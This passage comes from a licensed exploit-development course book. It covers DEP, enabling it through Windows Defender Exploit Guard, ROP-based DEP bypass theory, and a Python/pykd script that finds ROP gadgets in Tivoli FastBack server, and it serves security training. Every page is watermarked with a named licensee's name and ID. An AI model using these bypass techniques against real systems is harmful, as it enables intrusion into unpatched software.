9.1.1.1 Exercises 
1. 
Launch Notepad and attach WinDbg to it. 
2. 
Check the memory protections of the memory pages currently pointed to by both ESP and 
EIP. 
3. 
Verify the presence of DEP by using Narly. 
 
303 (James Johnson, 2011), https://github.com/d0c-s4vage/narly/blob/master/narly/ReadMe.txt 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
372 
4. 
Write a dummy shellcode to the stack and modify EIP to try to execute it. Observe the 
access violation due to DEP. 
9.1.2 Windows Defender Exploit Guard 
Before we start discussing how to bypass DEP, let’s turn our attention to the Tivoli FastBack 
server application, where we previously found vulnerabilities. 
If the VM has been reverted, we will need to install the software again, and then attach WinDbg to 
it. Once that is done, we can use Narly to determine if DEP is enabled: 
0:066> !nmod 
... 
00400000 00c0c000 FastBackServer       /SafeSEH OFF                C:\Program 
Files\Tivoli\TSM\FastBack\server\FastBackServer.exe 
... 
Listing 441 - DEP is not enabled for FastBack 
The output presented in Listing 441 reveals that DEP is not enabled. 
To enable DEP, we can either modify the operating system settings and set DEP to AlwaysOn, or 
use another security feature. 
In 2009, Microsoft released the Enhanced Mitigation Experience Toolkit (EMET)304 software 
package, which allows an administrator to enforce different mitigations even if the application 
was compiled without them. With EMET, it is possible to enable DEP for the FastBack server 
process without affecting other parts of the operating system. 
Microsoft deprecated EMET with the release of the Windows 10 Fall Creators Update. From that 
version of Windows 10 and forward, EMET was effectively embedded in the operating system and 
renamed to Windows Defender Exploit Guard (WDEG).305 We’ll use WDEG to enable DEP for the 
FastBack server. 
EMET and WDEG provide additional mitigations, and while we will come back to 
some of them in later modules, most are out of scope for this course. 
To use WDEG, we open Windows Defender Security Center, as shown in Figure 132. 
 
304 (Microsoft, 2017), https://web.archive.org/web/20210220064636/https://support.microsoft.com/en-us/topic/the-enhanced-
mitigation-experience-toolkit-45516ee8-35b6-f0bb-5608-2aca0a86fd35 
305 (Microsoft, 2017), https://www.microsoft.com/security/blog/2017/10/23/windows-defender-exploit-guard-reduce-the-attack-
surface-against-next-generation-malware/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
373 
 
Figure 132: Searching for Windows Defender Security Center 
In the new window, we will open App & browser control, scroll to the bottom, and click on Exploit 
protection settings. This opens the main WDEG window. 
 
Figure 133: WDEG main window 
To specify mitigations for a single application, we will choose the Program settings tab, click Add 
program to customize, and select Choose exact file path as shown in Figure 134. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
374 
 
Figure 134: Selecting application to protect 
In the file dialog window, we will navigate to C:\Program Files\Tivoli\TSM\FastBack\server and 
select FastBackServer.exe. In the new settings menu, we will scroll down to “Data Execution 
Prevention (DEP)” and enable it by ticking the Override system settings box, as shown in Figure 
135. 
 
Figure 135: Selecting application to protect 
After accepting the settings, we need to restart the FastBackServer service to have the changes 
take effect. If we were to attach WinDbg to the FastBack application and use Narly, it would still 
not report that DEP is enabled because Narly only presents information parsed from the 
executable. 
We can test the presence of DEP by once again writing some dummy shellcode on the stack and 
then manually modifying the EIP register to execute it. 
0:066> ed esp 90909090 
 
0:066> r eip = esp 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
375 
 
0:066> p 
(7a8.1310): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00240000 ebx=00000000 ecx=77939bc0 edx=77939bc0 esi=77939bc0 edi=77939bc0 
eip=0b93ff54 esp=0b93ff54 ebp=0b93ff80 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
0b93ff54 90              nop 
Listing 442 - Access violation in FastBack Server due to DEP 
WDEG allowed us to enable DEP for Tivoli, even though it was not compiled into it and without 
affecting other elements of the operating system. 
Now that we know a bit about how Data Execution Prevention works and have it enabled for our 
case study, let’s begin learning how it can be bypassed. 
9.1.2.1 Exercises 
1. 
Use Narly to view the missing DEP mitigation from FastBack Server. 
2. 
Open WDEG and enable DEP for Tivoli FastBack server. 
9.2 Return Oriented Programming 
As with most security features, one of the first questions we want to ask ourselves is, “how can 
we bypass it?”. To answer this question, we must start from the origins of DEP. 
The first techniques to bypass DEP were developed on Linux and called return-to-libc (ret2libc).306 
Once Windows introduced DEP, the concept behind ret2libc was adapted to work on it as well. 
Over the years, the technique was expanded, and the commonly-used Return Oriented 
Programming (ROP)307 method was developed. 
In the following sections, we will first examine the ret2libc technique as it was adapted to 
Windows, then we will dig into ROP and examine how to implement it as part of an exploit. 
9.2.1 Origins of Return Oriented Programming Exploitation 
Exploit developers first abused the fact that DEP can be disabled on a per-process basis. 
The idea is to invoke the NtSetInformationProcess308 API, which resides in a memory region that 
is already executable. With this, an attacker could disable DEP before executing their shellcode. 
This works by replacing the commonly-used JMP ESP assembly instruction with the memory 
address of NtSetInformationProcess. Additionally, we also have to place the required arguments 
on the stack as part of the overwrite. 
 
306 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Return-to-libc_attack 
307 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Return-oriented_programming 
308 (Tomasz Nowak, 2000), 
https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProcess%
2FNtSetInformationProcess.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
376 
Once the NtSetInformationProcess API finishes, DEP is disabled, and we can jump to our 
shellcode again. 
Other attack variations have been widely used in public exploits. One such attack uses the 
WinExec309 function to execute commands on the vulnerable system. While this is useful, it is not 
as effective as having arbitrary shellcode execution. 
To mitigate the bypass through NtSetInformationProcess, Microsoft implemented a mechanism 
called Permanent DEP. From Vista SP1 and XP SP3 onward, any executable linked with the 
/NXCOMPAT flag310 during compilation is automatically set as OptIn. This ensures that DEP can’t 
be disabled for the entire runtime duration of the process. 
This method has the same effect as the AlwaysOn system policy, but on a per-process basis. 
Directly calling the new SetProcessDEPPolicy311 API from the application itself yields the same 
results. 
From the attacker’s perspective, this means it isn’t possible to disable DEP for the entire process. 
The only option then, is to circumvent the Operating System NX checks. 
9.2.2 Return Oriented Programming Evolution 
The concept of Return Oriented Programming for exploitation was introduced by Sebastian 
Krahmer in the paper “x86-64 buffer overflow exploits, and the borrowed code chunks exploitation 
technique”.312 It was further developed by Hovav Shacham313 and Pablo Solé.314 
This technique allows a ret2libc attack to be mounted on x86/x64 executables without calling any 
functions. Instead of returning to the beginning of a function and simulating a call, we can return 
to any instruction sequence in the executable memory pages that ends with a return. 
Address Space Layout Randomization can impact and limit this technique. We 
will cover this in-depth in a later module. 
By combining a large number of short instruction sequences, we can build gadgets that allow 
arbitrary computation and perform higher-level actions, such as writing content to a memory 
location (Figure 136). 
 
309 (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/ms687393(VS.85).aspx 
310 (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/ms235442(v=vs.140).aspx 
311 (Microsoft, 2018), https://msdn.microsoft.com/en-us/library/bb736299(VS.85).aspx 
312 (Krahmer, 2005), https://www.offensive-security.com/AWEPAPERS/no-nx.pdf 
313 (Shacham, 2007), https://www.offensive-security.com/AWEPAPERS/geometry.pdf 
314 (Solé, 2008), https://www.offensive-security.com/AWEPAPERS/DEPLIB.pdf 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
377 
 
Figure 136: Gadgets that allow write of arbitrary content to memory 
The first gadget in the figure above pops a value from the stack into ECX. The return instruction 
makes it execute the next gadget, which in turn pops a value from the stack into EAX. 
Executing the next return instruction will bring us to the third gadget. This gadget will write the 
contents of EAX to the memory address stored in ECX. This concept allows us to write arbitrary 
content to an arbitrary memory address. 
The stack layout to accomplish this is illustrated in Figure 137. 
 
Figure 137: Gadgets that allow write of arbitrary content to memory 
In the figure above, the first column of hexadecimal values represents the memory addresses of 
the gadgets inside the target executable or DLLs loaded into the process space. 
Similarly, a gadget containing an instruction like “MOV EAX, [ECX]” can be used to read from 
arbitrary memory. By combining enough gadgets, we can achieve any type of computation we 
need. 
Because of the variable length of assembly instructions on the x86 architecture, returning into the 
middle of existing opcodes can lead to different instructions, as shown in Listing 443. 
0:077> u 004c10ee L2 
FastBackServer!std::_Allocate+0x1e: 
004c10ee 5d              pop     ebp 
004c10ef c3              ret 
 
0:077> u 004c10ee - 1 L2 
FastBackServer!std::_Allocate+0x1d: 
004c10ed 045d            add     al,5Dh 
004c10ef c3              ret 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
378 
Listing 443 - Different instruction depending on the offset 
This listing contains the first gadget, a simple “POP EBP”, followed by a return at the address 
0x004c10ee. If we decrease the address by one, we obtain a different instruction (“ADD AL,0x5D”), 
which is also followed by a return. 
This is not true for all architectures. For example, the ARM architecture has fixed-
length instructions. 
The number of obtainable gadgets depends on the Windows version and the vulnerable 
application. 
At this point, depending on our goals and on the number of gadgets we can obtain, there are two 
different approaches we could take: 
1. 
Build a 100% ROP shellcode. 
2. 
Build a ROP stage that can lead to subsequent execution of traditional shellcode. 
The first approach is rather complicated to implement, so we’ll pursue the second instead. A goal 
of the ROP stage could be to allocate a chunk of memory with write and execute permissions and 
then copy shellcode to it.315 
One way to implement this ROP attack is to allocate memory using the Win32 VirtualAlloc316 API. 
A different approach to bypass DEP could be to change the permissions of the memory page 
where the shellcode already resides317 by calling the Win32 VirtualProtect318 API. 
The address of VirtualProtect or VirtualAlloc is usually retrieved from the Import Address Table 
(IAT)319 of the target DLL. Then the required API parameters can be set on the stack before the 
relevant APIs are invoked. 
Often, it’s not possible to predict argument values before triggering the exploit, so we can use 
ROP itself to solve this problem as well. In the buffer that triggers the vulnerability, we can create 
a skeleton of the function call and then use ROP gadgets to dynamically set the parameters on 
the stack. 
As another alternative to bypass DEP, we could use the Win32 WriteProcessMemory320 API. The 
idea is to hot-patch the code section (specifically, the .text section) of a running process, inject 
shellcode, and then eventually jump into it. We don’t fight DEP here, we just follow its rules. 
This technique was presented by Spencer Pratt in March 2010.321 WriteProcessMemory is able to 
patch executable memory through a call to NtProtectVirtualMemory.322 
 
315 (John, 2006), https://www.offensive-security.com/AWEPAPERS/DEPevasion.pdf 
316 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc 
317 (Sintsov, 2010), http://www.exploit-db.com/exploits/12495/ 
318 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect 
319 (David Zimmer, 2009), http://sandsprite.com/CodeStuff/Understanding_imports.html 
320 (Microsoft, 2018), WriteProcessMemory, https://msdn.microsoft.com/en-us/library/ms681674(VS.85).aspx 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
379 
Ultimately, whichever method we choose to bypass DEP, we need to locate gadgets with various 
functionalities that can help us achieve our goals. Our next task is to understand how to locate 
gadgets, which includes a few different automation solutions. 
9.3 Gadget Selection 
So far, we have a good understanding of the theory behind DEP and how to overcome it with ROP. 
A key missing element is how to locate the gadgets that are needed to invoke the APIs. 
In a previous module, we leveraged the WinDbg search command to obtain the address of an 
instruction like JMP ESP. For ROP though, we need to locate the addresses of all the possible 
gadgets we can obtain. This first step will allow us to choose the gadgets we need and combine 
them to bypass DEP. 
However, it’s difficult to search for gadgets manually because of the large number of possible 
candidates. Instead, we’ll need to automate the process. We will discuss two different methods. 
The first method requires the use of Python along with the Pykd323 WinDbg extension. We will 
write our own script in order to gain a better understanding of the process. Then we will review 
another pre-built tool called RP++.324 
We will omit discussing Mona325 because it does not support Python3 or 64-bit at 
the time of writing. 
9.3.1 Debugger Automation: Pykd 
Pykd is a Python-based WinDbg extension with numerous APIs to help automate debugging and 
crash dump analysis. It combines the expressiveness and convenience of Python with the power 
of WinDbg. 
Pykd modules can either be used as standalone scripts or loaded as a WinDbg extension and 
provide us with a way to control the debugger from Python. This feature gives the researcher 
incredible flexibility by quickly expanding the debugger’s capabilities, without having to compile 
sources, reload the debugger’s interface, etc. 
It should be noted that the author of pykd is a native Russian speaker, which 
means that much of the official documentation is only available in Russian. 
 
321 (Pratt, 2010), http://www.exploit-db.com/papers/13660/ 
322 (Tomasz Nowak, 2000), https://www.offensive-security.com/AWEPAPERS/NtProtectVirtualMemory.pdf 
323 (Aleksey R., 2018), https://githomelab.ru/pykd/pykd 
324 (Axel Souchet, 2017), https://github.com/0vercl0k/rp 
325 (Corelan, 2011), https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
380 
Using pykd will allow us to automate the gadget search. We will begin by creating a simple “Hello 
World” example. Once we have a basic understanding of how to use pykd, we will build a Python 
script to locate gadgets. 
To make a basic Hello World script, we will reference the usage of pykd with the typical Python 
import statement, and then use the dprintln326 method to print a string to the console. The code is 
given in Listing 444.  
from pykd import * 
dprintln("Hello World!") 
Listing 444 - Hello World pykd script 
To run this pykd script, we must first attach WinDbg to the FastBackServer process and load pykd 
through the .load command. We will then use the !py extension command to use Python and 
supply the name and path of the script as an argument. 
0:066> .load pykd 
 
0:066> !py C:\Tools\pykd\HelloWorld.py 
Hello World! 
Listing 445 - Executing Hello World pykd script 
When we run the script, the string is printed to the console. Obviously, this is a very basic script, 
but due to the power of Python, it has unlimited potential. 
If the script has a standard “.py” extension, the extension can be omitted when 
running it in WinDbg 
Now that we know how to invoke a very basic pykd script, we are ready to move towards building 
our ROP finder script. There are multiple steps in this process, so first, we are going to take a 
high-level view of the technique and then dig into each step. 
The pykd script must locate gadgets inside code pages of an EXE or DLL with the execute 
permission set. 
The first step is to accept the name of the module as a parameter and locate it in memory. Then, 
for the selected module, we locate all memory pages that are executable. Code that is executed 
on these pages will not result in DEP throwing an access violation. 
For each of these memory pages, we are going to locate the memory address of all the RET 
assembly instructions and store them in a list. 
Once we have this list of memory addresses, we pick the first one, subtract one byte from it, and 
disassemble the opcodes to check if they are valid assembly instructions. If they are, we have 
found a possible ROP gadget. This process will continue, by subtracting another byte and 
rechecking. The maximum number of bytes to subtract depends on the length of ROP gadgets 
we want. 
 
326 (Aleksey R., 2018), https://githomelab.ru/pykd/pykd/-/wikis/API%20Reference#dprintln 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
381 
 
Typically, it is not beneficial to search for very long ROP gadgets because they 
will eventually contain instructions that are not useful, such as calls and jumps. 
With this high-level understanding, let’s start implementing our gadget search using Python and 
pykd. First, we must obtain a reference to the module where we want to locate gadgets. To 
accomplish this, we can use the pykd module327 class to create a Python object that represents a 
loaded DLL or EXE:  
from pykd import * 
 
if __name__ == '__main__': 
 count = 0 
 try: 
     modname = sys.argv[1].strip() 
 except IndexError: 
     print("Syntax: findrop.py modulename") 
     sys.exit() 
 
 mod = module(modname) 
Listing 446 - Selecting the module name and obtaining a reference to it 
With a reference to the module, we have to find the number of memory pages inside of it. 
On the x86 architecture, every memory page is 0x1000 bytes, and the module object contains the 
properties begin328 and end,329 which returns the start and end address of the allocated memory 
for the module. 
We can find the number of memory pages using simple math, as shown in the updated code in 
Listing 447.  
from pykd import * 
 
PAGE_SIZE = 0x1000 
 
if __name__ == '__main__': 
 count = 0 
 try: 
     modname = sys.argv[1].strip() 
 except IndexError: 
     print("Syntax: findrop.py modulename") 
     sys.exit() 
 
 mod = module(modname) 
 
 if mod: 
 
327 (Aleksey R., 2018), https://githomelab.ru/pykd/pykd/-/wikis/API%20Reference#module 
328 (Aleksey R., 2018), https://githomelab.ru/pykd/pykd/-/wikis/API%20Reference#module.begin 
329 (Aleksey R., 2018), https://githomelab.ru/pykd/pykd/-/wikis/API%20Reference#module.end 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
382 
    pn = int((mod.end() - mod.begin()) / PAGE_SIZE) 
    print("Total Memory Pages: %d" % pn) 
Listing 447 - Locating the number of memory pages for the module 
When we run the script, we are first prompted for a module name. If we select the FastBackServer 
executable, we find the number of memory pages, as shown in Listing 448. 
0:066> !py C:\Tools\pykd\findrop 
Syntax: findrop.py modulename 
 
0:066> !py C:\Tools\pykd\findrop FastBackServer 
Total Memory Pages: 2060 
Listing 448 - Output showing the number of memory pages in FastBackServer 
Although we have found a large number of memory pages, many of them will not be executable. 
The next task is to parse each of them and locate the ones that are executable. 
The pykd getVaProtect330 method will return the memory protection constant331 enum value for a 
given address. There are quite a few of these enum values, but the four that represent executable 
pages 
are 
called 
PAGE_EXECUTE 
(0x10), 
PAGE_EXECUTE_READ 
(0x20), 
PAGE_EXECUTE_READWRITE (0x20), and PAGE_EXECUTE_WRITECOPY (0x80). 
The idea is to loop over each memory page, invoke getVaProtect on the first address of the page, 
and check if the result is equal to one of the four values above. 
This is implemented in the updated script (Listing 449), which stores the address of each of these 
executable pages in an array.  
from pykd import * 
 
PAGE_SIZE = 0x1000 
 
MEM_ACCESS_EXE = { 
0x10  : "PAGE_EXECUTE"                                                     , 
0x20  : "PAGE_EXECUTE_READ"                                                , 
0x40  : "PAGE_EXECUTE_READWRITE"                                           , 
0x80  : "PAGE_EXECUTE_WRITECOPY"                                           , 
} 
 
def isPageExec(address): 
 try: 
     protect = getVaProtect(address) 
 except: 
     protect = 0x1 
 if protect in MEM_ACCESS_EXE.keys(): 
     return True 
 else: 
     return False 
 
if __name__ == '__main__': 
 count = 0 
 
330 (Aleksey R., 2018), https://githomelab.ru/pykd/pykd/-/wikis/API%20Reference#getVaProtect 
331 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
383 
 try: 
     modname = sys.argv[1].strip() 
 except IndexError: 
     print("Syntax: findrop.py modulename") 
     sys.exit() 
 
 mod = module(modname) 
 pages = [] 
 
 if mod: 
    pn = int((mod.end() - mod.begin()) / PAGE_SIZE) 
    print("Total Memory Pages: %d" % pn) 
     
    for i in range(0, pn): 
     page = mod.begin() + i*PAGE_SIZE 
     if isPageExec(page): 
         pages.append(page) 
    print("Executable Memory Pages: %d" % len(pages)) 
Listing 449 - Locating executable pages with pykd 
To ease the readability, the code to check if a memory page is executable has been put in a 
separate function (isPageExec) that is called repeatedly. 
The loop itself starts at the beginning of the module and increases the inspected address by 
0x1000 bytes at each iteration, until it reaches the end of the module memory. 
Executing the script will print the number of executable pages while storing the address of each 
of them in an array. The output from running the script is given in Listing 450. 
0:066> !py C:\Tools\pykd\findrop FastBackServer 
Total Memory Pages: 2060 
Executable Memory Pages: 637 
Listing 450 - Locating executable memory pages with pykd 
Now, after locating all the executable pages, we can search each of them for return instructions. 
Remember that our overall goal is to search backward from all of the return instructions to detect 
possible gadgets. 
There are two types of return instructions. The first type is the regular RET instruction, which pops 
the address at the top of the stack into EIP and increases ESP by 4. The second type is “RET 
0xXX”, where the address at the top of the stack is popped into EIP, and ESP is increased by 0xXX 
bytes. 
The normal return instruction has the opcode value 0xC3, whereas the return with an offset has 
an opcode of 0xC2, followed by the number of bytes in the offset. This means that if we search all 
bytes on a page to check if they are 0xC3 or 0xC2, we will find all return instructions. 
We can write a simple algorithm that iterates over each byte for every executable page and tests 
for the return opcodes. We will implement the algorithm as a separate function in which we 
initially set up an empty array to hold all the return instruction addresses. 
def findRetn(pages): 
 retn = [] 
 for page in pages: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
384 
     ptr = page 
     while ptr < (page + PAGE_SIZE): 
         b = loadSignBytes(ptr, 1)[0] & 0xff 
         if b not in [0xc3, 0xc2]: 
             ptr += 1 
             continue 
         else: 
             retn.append(ptr) 
             ptr += 1 
              
 print("Found %d ret instructions" % len(retn)) 
 return retn 
Listing 451 - Double loop to locate all return instructions 
In the outer for loop shown in Listing 451, we iterate over all the executable pages we located. For 
each of these entries, we will perform a while loop that will go through each byte in the given 
page, pointed by the ptr variable. 
The pykd loadSignBytes332 API is used to read the byte at the given memory address, pointed to 
by ptr. The API returns signed bytes and through a bitwise AND operation (“&”) we obtain the 
unsigned value. 
The byte is then compared to the two return instruction opcode values. If a return instruction is 
found, the address is added to the retn array. 
At the end of the function, the number of return instructions found is printed, and the populated 
array is returned. 
We can now update the Python script by adding the findRetn function and call it from the main 
function. Once executed, we manage to locate a large number of return instructions, as shown in 
Listing 452. 
0:066> !py C:\Tools\pykd\findrop FastBackServer 
Total Memory Pages: 2060 
Executable Memory Pages: 637 
Found 13155 ret instructions 
Listing 452 - Return addresses were found in FastBackServer.exe 
We should note that the script can take a while to execute since it is scanning 
every byte inside the executable memory pages. 
With every return instruction in hand, we can finally discover all the available gadgets. We’ll do this 
by iterating over each return instruction and subtract one byte, then attempt to disassemble the 
resulting instructions. Next, we subtract two bytes and disassemble the resulting instructions. We 
repeat this process until we reach the maximum gadget size we want. 
Since not all binary values correspond to valid opcodes, we will encounter many invalid 
instructions, and our code needs to detect and handle this scenario. Additionally, if a gadget 
 
332 (Aleksey R., 2018), https://githomelab.ru/pykd/pykd/-/wikis/API%20Reference#loadSignBytes 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
385 
contains an instruction that will alter the execution flow, such as a jump or a call, we must filter 
them out as well. 
Finally, assembly language contains several privileged instructions, which a regular application 
cannot execute. We must design our algorithm to remove these also. 
This can sound like a lot of work, but luckily the pykd APIs provide us with what we need to make 
this task more manageable. 
We can use the disasm333 class to disassemble a CPU instruction at any given memory address. 
Then, we can invoke the instruction334 method on the instantiated disasm object to obtain the 
given instruction. 
Before we build out the full algorithm to locate all gadgets, let’s try to implement a simple version. 
We will find and print a single instruction by subtracting one byte from the first return instruction. 
We’ll implement this test in a new function named getGadgets in Listing 453. 
def getGadgets(addr): 
  ptr = addr - 1 
  dasm = disasm(ptr) 
  gadget_size = dasm.length() 
  print("Gadget size is: %x" % gadget_size) 
  instr = dasm.instruction() 
  print("Found instruction: %s" % instr) 
Listing 453 - Finding and printing a single instruction 
In the above code, the address of the return instruction passed to getGadgets is decremented by 
one byte and assigned to ptr. Next, we instantiate the disasm object from the memory address 
and assign the object to the dasm variable. 
With the object created, we call the length335 method to get the size of the current gadget and 
print it. Finally, we use the instruction method to return and print the disassembled instruction. 
If we update the script by inserting this function and call it after locating all the return instructions, 
we will disassemble and print the very first gadget in FastBackServer as shown in Listing 454. 
0:066> !py C:\Tools\pykd\findrop FastBackServer 
Total Memory Pages: 2060 
Executable Memory Pages: 637 
Found 13155 ret instructions 
Gadget size is: 1 
Found instruction: 00401015 5d              pop     ebp 
Listing 454 - Finding and printing the first gadget 
In the output, we have located the hexadecimal value of 0x5D, just before the return instruction. 
The output states that this value equates to the instruction “POP EBP”. 
The address 0x401015 will give us access to the gadget “POP EBP; RETN”. We can use it since it 
contains valid instructions, none of which are privileged. 
 
333 (Aleksey R., 2018), https://githomelab.ru/pykd/pykd/-/wikis/API%20Reference#disasm.disasm 
334 (Aleksey R., 2018), https://githomelab.ru/pykd/pykd/-/wikis/API%20Reference#disasm.instruction 
335 (Aleksey R., 2018), https://githomelab.ru/pykd/pykd/-/wikis/API%20Reference#disasm.length 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
386 
The next step is to scale up this process with multiple tasks, the first of which is to subtract more 
than one byte. 
In our script, we are going to set the default gadget length value to “8”, but also allow the user to 
input a custom value. 
Second, we must create a list of privileged instructions along with the WinDbg interpretation of an 
invalid instruction, which is given as “???”. 
In Listing 455, we have a list of privileged instructions336 along with the representation of an 
invalid instruction. The explanation of each one is beyond the scope of this module. The 
important point is to avoid any gadgets with any of these instructions as they would cause an 
access violation while executing. 
BAD = ["clts", "hlt", "lmsw", "ltr", "lgdt", "lidt" ,"lldt", "mov cr", "mov dr", 
    "mov tr", "in ", "ins", "invlpg", "invd", "out", "outs", "cli", "sti" 
    "popf", "pushf", "int", "iret", "iretd", "swapgs", "wbinvd", "???"] 
Listing 455 - Privileged assembly instructions 
We must also expand this list of bad assembly instructions to contain any execution flow 
instructions, like a call or a jump. An updated list is given in Listing 456. 
BAD = ["clts", "hlt", "lmsw", "ltr", "lgdt", "lidt" ,"lldt", "mov cr", "mov dr", 
    "mov tr", "in ", "ins", "invlpg", "invd", "out", "outs", "cli", "sti" 
    "popf", "pushf", "int", "iret", "iretd", "swapgs", "wbinvd", "call", 
    "jmp", "leave", "ja", "jb", "jc", "je", "jr", "jg", "jl", "jn", "jo", 
    "jp", "js", "jz", "lock", "enter", "wait", "???"] 
Listing 456 - List of bad assembly instructions in regards to ROP gadgets 
In some advanced cases, we might want to make use of a gadget containing a 
conditional jump instruction or a call. If we craft the stack layout appropriately, 
we can make use of these gadgets without disrupting the execution flow, but 
typically, it is best to avoid them altogether unless strictly required by specific 
conditions. 
Since the output of the instruction method will be presented as a readable ASCII string like “POP 
EBP”, we can use our generated list of bad instructions together with Python’s any337 method. Its 
usage in an if statement is shown in Listing 457. 
if any(bad in instr for bad in BAD): 
  break 
Listing 457 - Detecting bad instructions 
The instr variable will contain the output of the instruction method. Here we will compare all the 
elements of the instr variable with all elements in the array of bad instructions called BAD. If any 
 
336 (Mike, 2010), http://www.brokenthorn.com/Resources/OSDev23.html 
337 (W3Schools, 2020), https://www.w3schools.com/python/ref_func_any.asp 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
387 
of them are equal, the any function will return true, triggering the break instruction and allowing us 
to skip to the next ptr address. 
The code also verifies that the series of instructions ends with a ret instruction, to ensure that it is 
indeed a usable gadget. 
The final part involves combining all the previous steps along with some code that outputs the 
results to a file, which we can search through later. Since this is not a Python course, we are going 
to omit a detailed description of these steps. The complete script is located in 
C:\Tools\pykd\findropfull.py. 
When the script is executed, it will save the gadgets in C:\tools\pykd\findrop_output.txt, where we 
can use a text editor to search through it. 
First, let’s execute the complete script and allow it to generate the file, as shown in Listing 458. 
0:066> !py C:\Tools\pykd\findrop FastBackServer 
############################################################### 
# findrop.py pykd Gadget Discovery module # 
############################################################### 
[+] Total Memory Pages: 2060 
[+] Executable Memory Pages: 637 
[+] Found 13155 ret instructions 
[+] Gadget discovery started... 
[+] Gadget discovery ended (13 secs). 
[+] Found 30368 gadgets in FastBackServer. 
Listing 458 - Executing the complete findrop script 
As we note from the highlighted portion of the output, the script found more than 30000 gadgets 
in the executable. Many of these are identical since our code does not check for duplicates. 
If we open up the generated findrop_output.txt file, as given in Listing 459, we find each gadget 
printed nicely along with its address in the first column: 
... 
-------------------------------------------------------------------------------------- 
 
00401015 5d              pop     ebp 
 
00401016 c3              ret 
 
-------------------------------------------------------------------------------------- 
 
00401013 8be5            mov     esp,ebp 
 
00401015 5d              pop     ebp 
 
00401016 c3              ret 
 
-------------------------------------------------------------------------------------- 
... 
Listing 459 - Contents of generate findrop_output.txt file 
The code developed here is by no means optimized. Even the output is not the best for searching; 
however, it allows us to understand the basics of how to find gadgets. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
388 
In the next section, we are going to cover another automated solution that will provide faster 
processing speed and better output for searching. 
9.3.1.1 Exercises 
1. 
Go through the steps of developing the pykd script and observe the output from it. 
2. 
Execute the final script and attempt to locate different gadgets in the findrop_output.txt file. 
9.3.2 Optimized Gadget Discovery: RP++ 
In this section, we are going to introduce a different automated tool to find ROP gadgets. This tool 
will greatly increase our speed, compared to other scripts. 
The rp++338 tool is a series of open-source applications written in C++ and provides support for 
both 32-bit and 64-bit CPUs. Additionally, the various compiled executables can run on Windows, 
Linux, and macOS and can locate gadgets in Windows PE files, Linux ELF files,339 and macOS 
Mach-O files.340 
Besides supporting a wide array of operating systems, rp++ does not run inside the debugger, but 
rather works directly on the file system. This provides a massive speed increase and is one of the 
reasons we prefer it. 
While rp++ is open-source, the source code is too large to walk through here and 
requires a strong working knowledge of C++ programming. 
rp++ follows the same principles of locating ROP gadgets as shown in our pykd script. The 32-bit 
version of rp++ is located in the C:\tools\dep directory on the student VM. 
First, we copy the FastBackServer.exe executable to the C:\tools\dep folder, then we can invoke 
rp-win-x86.exe. We must first supply the file to be processed with the -f option and the 
maximum gadget length with the -r parameter. 
In this case, the maximum gadget length is the number of assembly instructions in the ROP 
gadget, not the actual number of bytes, unlike in the pykd script. 
